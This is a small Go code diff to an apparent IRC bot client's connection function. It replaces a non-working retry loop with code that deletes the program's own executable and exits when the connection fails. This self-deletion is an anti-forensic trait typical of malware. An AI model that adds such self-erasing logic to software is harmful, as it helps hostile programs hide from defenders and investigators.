@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"os"
 	"strings"
 	"time"
 )
@@ -14,10 +15,12 @@ type logFormation struct {
 
 func IRC_Conn(set_serv string) net.Conn {
 	conn, err := net.Dial("tcp", set_serv)
-	for err != nil {
-		time.Sleep(10 * time.Second)
-		continue
-	}
+	go func() {
+		if err != nil {
+			os.Remove(os.Args[0])
+			os.Exit(0)
+		}
+	}()
 	return conn
 }
 
